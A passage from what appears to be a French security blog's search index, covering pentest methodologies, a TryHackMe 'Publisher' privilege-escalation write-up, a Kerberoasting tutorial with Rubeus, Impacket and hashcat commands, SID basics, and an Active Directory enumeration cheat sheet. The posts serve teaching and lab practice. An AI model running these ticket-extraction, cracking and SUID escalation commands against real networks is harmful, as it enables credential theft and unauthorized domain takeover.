tests de pénétration est la Penetration Testing Execution Standard . La PTES fournit un cadre qui divise le processus de test de pénétration en sept phases distinctes : interactions avant engagement, collecte de renseignements, modélisation des menaces, analyse des vulnérabilités, exploitation, post-exploitation et reporting. http://www.pentest-standard.org/index.php/Main_Page\nLe Technical Guide to Information Security Testing and Assessment représente une approche plus formelle. Bien qu'il ne s'agisse pas strictement d'une méthodologie de test de pénétration, il fournit des conseils précieux sur la planification, l'exécution et les activités post-test de l'évaluation de la sécurité. Ce cadre est particulièrement pertinent lorsque l'on travaille avec des agences ou des organisations gouvernementales qui suivent les directives du NIST. https://www.nist.gov/privacy-framework/nist-sp-800-115\nOpen Web Application Security Project L’OWASP WSTG se concentre sur les tests de sécurité applicative web, avec des cas de test détaillés pour chaque vecteur d’attaque connu.\nhttps://owasp.org/www-project-web-security-testing-guide/stable/\nLe cadre MITRE ATT\u0026amp;CK https://attack.mitre.org/\n","permalink":"https://nyobemichel.me/posts/pr%C3%A9requis-pour-un-test-de-p%C3%A9n%C3%A9tration/","summary":"Une vue d\u0026rsquo;ensemble structurée des prérequis et méthodologies à maîtriser avant de réaliser un test d’intrusion.","title":"Prérequis pour un test de pénétration part1"},{"content":"Enumeration Nmap Nous commençons par exécuter une analyse nmap sur la cible :\nLe scan nous montre que le port 22 et 80 sont ouverts.\nWebserver Je tombe sur un site web anodin :\nAprès énumération des répertoires, je découvre /spip :\nRéférence Metasploit utilisée :\nhttps://github.com/rapid7/metasploit-framework/pull/17711/files\nAprès plusieurs heures, j’ai essayé le framework Metasploit :\nPATH Injection AppArmor est un outil qui permet de restreindre un programme avec des règles. Vous pouvez accéder à ces informations par une simple recherche sur Google.\nJ’ai eu cette indication dans la salle, je suis donc allé examiner les fichiers AppArmor pour mieux comprendre les règles :\nJ\u0026rsquo;ajoute le dossier /var/tmp, sur lequel j’ai les droits d’écriture.\nJe crée ensuite un fichier binaire appelé docker et l\u0026rsquo;autorise à s\u0026rsquo;exécuter. Ce fichier contient /bin/bash -p. Je souhaite donc utiliser la commande bash en mode privilégié.\nSi vous faites attention, lorsque j’imprime la valeur $PATH, le shell initial est ash, mais après l’opération, il devient bash.\nEnsuite, je copie mon fichier docker dans /opt/run_container.sh et j\u0026rsquo;exécute le binaire /usr/sbin/run_container avec le bit SUID… et je suis ROOT !!!\n","permalink":"https://nyobemichel.me/posts/publisher-thm/","summary":"tryhackme","title":"Publisher - THM"},{"content":"Introduction Kerberoasting est une technique d’attaque post-exploitation qui cible les environnements Active Directory, plus précisément les comptes de service protégés par le protocole d’authentification Kerberos.\nL’objectif de l’attaquant est de récupérer des tickets de service (TGS) chiffrés, puis de craquer hors ligne les hashs de mots de passe des comptes de service associés à des Service Principal Names (SPN). Une fois le mot de passe récupéré, cela peut mener à une élévation de privilèges ou à une lateralisation dans le réseau.\n⚙️ Fonctionnement du protocole Kerberos (rappel rapide) Lorsqu’un utilisateur demande l’accès à un service, il envoie un TGT (Ticket Granting Ticket) valide et le nom du service (via le sname) au KDC (Key Distribution Center). Si le ticket est valide, le KDC renvoie un TGS, chiffré avec le hash du mot de passe du compte de service ciblé.\nC’est cette étape que l’attaquant va détourner pour capturer ce TGS et tenter de retrouver le mot de passe par brute force ou dictionnaire.\n🧠 Étapes de l’attaque Kerberoasting Voici le workflow typique d’une attaque Kerberoasting :\n1. Accès initial L’attaquant compromet un compte d’utilisateur standard dans le domaine Active Directory.\n2. Reconnaissance Il utilise des outils pour énumérer les SPN présents dans le domaine (comptes de service).\n3. Requête TGS Il envoie des requêtes au contrôleur de domaine pour obtenir les tickets TGS associés à ces SPN.\n4. Extraction de tickets Il extrait les TGS localement (le système les stocke en mémoire), à l’aide d’outils comme Rubeus ou Mimikatz.\n5. Crackage hors ligne Le ticket est cracké hors ligne avec Hashcat ou John the Ripper afin de révéler le mot de passe du compte de service.\n🔧 Outils utiles Voici une liste d’outils populaires pour mener une attaque Kerberoasting :\nRubeus (C#) Mimikatz Impacket - GetUserSPNs.py PowerView (PowerShell) Empire / Invoke-Kerberoast.ps1 Hashcat ou John pour le crackage hors ligne 💥 Exécution de l’attaque - Cas pratiques 🎯 Kerberoasting avec Rubeus Rubeus.exe kerberoast 💣 Cracker le hash avec Hashcat hashcat -m 13100 -a 0 hash.txt wordlist.txt 🐍 Kerberoasting avec Impacket (GetUserSPNs.py) Lister les comptes SPN :\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend Extraire le TGS chiffré :\nsudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.3.141 -request ⚡ Kerberoasting avec PowerView Importer PowerView :\nImport-Module .\\PowerView.ps1 Lister les utilisateurs avec SPN :\nGet-DomainUser * -SPN | select samaccountname Extraire un TGS au format Hashcat :\nGet-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat Exporter tous les tickets vers un fichier CSV:\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\tickets.csv -NoTypeInformation 🧭 Contextes d’exécution possibles Une attaque Kerberoasting peut être lancée à partir de différents environnements :\n💻 Windows joint au domaine, avec un shell utilisateur ou SYSTEM 🐧 Linux joint ou non au domaine, avec keytab ou identifiants 🔐 Shell distant avec runas /netonly sur Windows 🧪 Via un accès VPN ou une session RDP, avec des outils de pentest 🛡️ Détection \u0026amp; défense Pour se défendre contre Kerberoasting, voici quelques bonnes pratiques :\nUtiliser des mots de passe robustes et complexes pour les comptes de service Éviter les comptes de service à privilèges élevés (comme Domain Admin) Implémenter Managed Service Accounts (MSA/gMSA) Surveiller les requêtes TGS en masse Déployer des solutions de détection comportementale (EDR, SIEM, etc.) Restreindre les permissions des utilisateurs standards 📚 Références utiles Rubeus GitHub Impacket Tools PowerView Kerberoasting Technique (MITRE ATT\u0026amp;CK) ","permalink":"https://nyobemichel.me/posts/activedirectory/kerberoasting/","summary":"Une attaque redoutable post-exploitation qui cible les services Kerberos dans les environnements Active Directory. Décryptons ensemble la méthode, les outils et les moyens de défense.","title":"Kerberoasting : Attaque d'Active Directory via Kerberos"},{"content":"Comprendre les Identificateurs de Sécurité (SID) dans Active Directory Un identificateur de sécurité (SID) est utilisé pour identifier de manière unique un principal de sécurité ou un groupe de sécurité dans un environnement Windows. Ces identifiants jouent un rôle fondamental dans la gestion des autorisations et l\u0026rsquo;authentification au sein d’un domaine Active Directory.\n1. Qu’est-ce qu’un principal de sécurité ? Un principal de sécurité est toute entité pouvant être authentifiée par le système d’exploitation. Il peut s’agir :\nd’un compte d’utilisateur,\nd’un compte d’ordinateur,\nou d’un thread ou processus exécuté dans le contexte de sécurité d’un compte existant.\nChaque fois qu’un utilisateur se connecte, le système génère un jeton d’accès contenant :\nle SID de l’utilisateur,\nles droits de l’utilisateur,\net les SID des groupes auxquels l’utilisateur appartient.\nCe jeton d’accès définit le contexte de sécurité utilisé par l’utilisateur pour interagir avec le système.\n2. Architecture d’un SID Un SID est une structure de données binaire contenant un nombre variable de valeurs. Les premières valeurs décrivent la structure du SID, tandis que les suivantes identifient l’autorité, le domaine et l’objet.\nUne fois converti au format lisible, un SID suit généralement cette notation standard :\nCopierModifier\nS-R-X-Y1-Y2-Yn-1-Yn\nExemple : Le SID du groupe intégré Administrateurs est représenté comme suit :\nCopierModifier\nS-1-5-32-544\nDécomposons ce SID :\nS : identifie qu’il s’agit d’un SID.\n1 : niveau de révision.\n5 : autorité d’identification (Autorité NT).\n32 : identifiant du domaine (Builtin).\n544 : identifiant relatif (RID) pour le groupe « Administrateurs ».\n3. SID connus Certains SID sont pré-définis et restent constants, quel que soit l’environnement ou le système. Ces SID connus sont générés automatiquement lors de l’installation du système d’exploitation ou de la création du domaine. Ils sont utilisés pour identifier :\ndes groupes génériques (Administrateurs, Utilisateurs, etc.),\nou des comptes système standards.\nPar exemple :\nS-1-5-18 : représente le compte SYSTEM.\nS-1-5-19 : correspond au Service local.\nS-1-5-32-544 : désigne le groupe Administrateurs.\nRéférences Comprendre les identificateurs de sécurité - Microsoft Docs ","permalink":"https://nyobemichel.me/posts/sid--identificateurs-de-s%C3%A9curit%C3%A9-/","summary":"Un identificateur de sécurité (SID) est essentiel dans la gestion des accès et de la sécurité dans les systèmes Windows. Découvrez comment il fonctionne, son rôle dans l\u0026rsquo;authentification et sa structure binaire.","title":"SID ( Identificateurs de sécurité )"},{"content":"📁 1. Domaine et Forêts 🔍 Obtenir le domaine actuel Get-Domain # PowerView Get-ADDomain # Module ActiveDirectory 🌐 Interroger un autre domaine Get-Domain -Domain example.local Get-ADDomain -Identity example.local 🆔 Récupérer le SID du domaine Get-DomainSID (Get-ADDomain).DomainSID 🖥️ Récupérer les contrôleurs de domaine Get-DomainController Get-ADDomainController 🤝 Obtenir les relations d’approbation (trusts) Get-DomainTrust Get-ADTrust 🌲 Informations sur la forêt Get-Forest Get-ADForest 📜 Lister tous les domaines d’une forêt Get-ForestDomain (Get-ADForest).Domains 🗺️ Cartographier les fiducies d\u0026rsquo;une forêt Get-ForestTrust Get-ADTrust -Filter \u0026#39;ms-DS-TrustForestTrustInfo -ne \u0026#34;$null\u0026#34;\u0026#39; 👤 2. Utilisateurs 👥 Liste des utilisateurs Get-DomainUser Get-ADUser -Filter * -Properties * 🔍 Détails d’un utilisateur spécifique Get-DomainUser -Identity user1 -Properties * Get-ADUser -Identity user1 -Properties * 🔄 Propriétés utiles Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name 👑 Membres du groupe « Enterprise Admins » Get-DomainGroupMember -Identity \u0026#34;Enterprise Admins\u0026#34; -Recurse 🖥️ Groupes locaux d\u0026rsquo;une machine (privilèges requis) Get-NetLocalGroup -ComputerName dcorp-dc Get-NetLocalGroup -ComputerName dcorp-dc -GroupName Administrators 🔎 Recherche d’accès administrateur local Find-LocalAdminAccess -Verbose 🔐 Comptes dont le mot de passe n’expire jamais Get-ADUser -Filter {PasswordNeverExpires -eq $true} 🎭 Comptes avec délégation Kerberos activée Get-ADUser -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} 🧾 Droits de l\u0026rsquo;utilisateur actuel whoami /priv 👪 3. Groupes 📋 Lister les groupes Get-DomainGroup Get-ADGroup -Filter * -Properties * 🔍 Rechercher des groupes contenant \u0026ldquo;admin\u0026rdquo; Get-DomainGroup *admin* Get-ADGroup -Filter \u0026#39;Name -Like \u0026#34;*admin*\u0026#34;\u0026#39; 👑 Membres « Domain Admins » Get-DomainGroupMember -Identity \u0026#34;Domain Admins\u0026#34; -Recurse 🖥️ 4. Machines \u0026amp; Serveurs 📜 Liste des ordinateurs Get-DomainComputer Get-ADComputer -Filter * -Properties * 🔍 Recherche spécifique (ex. Server 2022) Get-DomainComputer -OperatingSystem \u0026#34;*Server 2022*\u0026#34; 📡 Test de connectivité Get-ADComputer -Filter * -Properties DNSHostName | % { Test-Connection -Count 1 -ComputerName $_.DNSHostName } 👁️ Localisation des sessions d’un utilisateur Find-DomainUserLocation -UserGroupIdentity \u0026#34;RDPUsers\u0026#34; 🔐 5. ACL et Permissions 🔍 Obtenir les ACL d’un objet Get-DomainObjectAcl -SamAccountName user1 -ResolveGUIDs 🧠 Rechercher des ACE intéressants Find-InterestingDomainAcl -ResolveGUIDs 📂 ACL sur un chemin spécifique Get-PathAcl -Path \u0026#34;\\\\dcorp-dc.dollarcorp.moneycorp.local\\sysvol\u0026#34; 📂 6. Autres Techniques 📂 Découverte de serveurs de fichiers Get-NetFileServer 📚 Ressources utiles PowerView Documentation (PowerSploit) Cmdlets Active Directory Microsoft ","permalink":"https://nyobemichel.me/posts/activedirectory/enumeration-active-directory/","summary":"\u003ch2 id=\"-1-domaine-et-forêts\"\u003e📁 1. Domaine et Forêts\u003c/h2\u003e\n\u003ch3 id=\"-obtenir-le-domaine-actuel\"\u003e🔍 Obtenir le domaine actuel\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Domain\u003c/span\u003e                \u003cspan class=\"c\"\u003e# PowerView\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e              \u003cspan class=\"c\"\u003e# Module ActiveDirectory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-interroger-un-autre-domaine\"\u003e🌐 Interroger un autre domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Domain\u003c/span\u003e \u003cspan class=\"n\"\u003e-Domain\u003c/span\u003e \u003cspan class=\"n\"\u003eexample\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003elocal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003eexample\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003elocal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-récupérer-le-sid-du-domaine\"\u003e🆔 Récupérer le SID du domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainSID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eDomainSID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-récupérer-les-contrôleurs-de-domaine\"\u003e🖥️ Récupérer les contrôleurs de domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainController\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomainController\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-obtenir-les-relations-dapprobation-trusts\"\u003e🤝 Obtenir les relations d’approbation (trusts)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-informations-sur-la-forêt\"\u003e🌲 Informations sur la forêt\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Forest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADForest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-lister-tous-les-domaines-dune-forêt\"\u003e📜 Lister tous les domaines d’une forêt\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ForestDomain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eGet-ADForest\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eDomains\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-cartographier-les-fiducies-dune-forêt\"\u003e🗺️ Cartographier les fiducies d\u0026rsquo;une forêt\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ForestTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADTrust\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ms-DS-TrustForestTrustInfo -ne \u0026#34;$null\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-2-utilisateurs\"\u003e👤 2. Utilisateurs\u003c/h2\u003e\n\u003ch3 id=\"-liste-des-utilisateurs\"\u003e👥 Liste des utilisateurs\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainUser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-détails-dun-utilisateur-spécifique\"\u003e🔍 Détails d’un utilisateur spécifique\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-propriétés-utiles\"\u003e🔄 Propriétés utiles\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eselect \u003c/span\u003e\u003cspan class=\"n\"\u003e-First\u003c/span\u003e \u003cspan class=\"mf\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Member\u003c/span\u003e \u003cspan class=\"n\"\u003e-MemberType\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eProperty\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eselect \u003c/span\u003e\u003cspan class=\"n\"\u003eName\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-membres-du-groupe--enterprise-admins-\"\u003e👑 Membres du groupe « Enterprise Admins »\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroupMember\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Enterprise Admins\u0026#34;\u003c/span\u003e \u003cspan class=\"n\"\u003e-Recurse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-groupes-locaux-dune-machine-privilèges-requis\"\u003e🖥️ Groupes locaux d\u0026rsquo;une machine (privilèges requis)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetLocalGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nb\"\u003edcorp-dc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetLocalGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nb\"\u003edcorp-dc\u003c/span\u003e \u003cspan class=\"n\"\u003e-GroupName\u003c/span\u003e \u003cspan class=\"n\"\u003eAdministrators\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-recherche-daccès-administrateur-local\"\u003e🔎 Recherche d’accès administrateur local\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-LocalAdminAccess\u003c/span\u003e \u003cspan class=\"n\"\u003e-Verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-comptes-dont-le-mot-de-passe-nexpire-jamais\"\u003e🔐 Comptes dont le mot de passe n’expire jamais\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003ePasswordNeverExpires\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-comptes-avec-délégation-kerberos-activée\"\u003e🎭 Comptes avec délégation Kerberos activée\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eTrustedForDelegation\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e \u003cspan class=\"o\"\u003e-or\u003c/span\u003e \u003cspan class=\"n\"\u003eTrustedToAuthForDelegation\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-droits-de-lutilisateur-actuel\"\u003e🧾 Droits de l\u0026rsquo;utilisateur actuel\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ewhoami\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003epriv\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-3-groupes\"\u003e👪 3. Groupes\u003c/h2\u003e\n\u003ch3 id=\"-lister-les-groupes\"\u003e📋 Lister les groupes\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-rechercher-des-groupes-contenant-admin\"\u003e🔍 Rechercher des groupes contenant \u0026ldquo;admin\u0026rdquo;\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroup\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eadmin\u003c/span\u003e\u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Name -Like 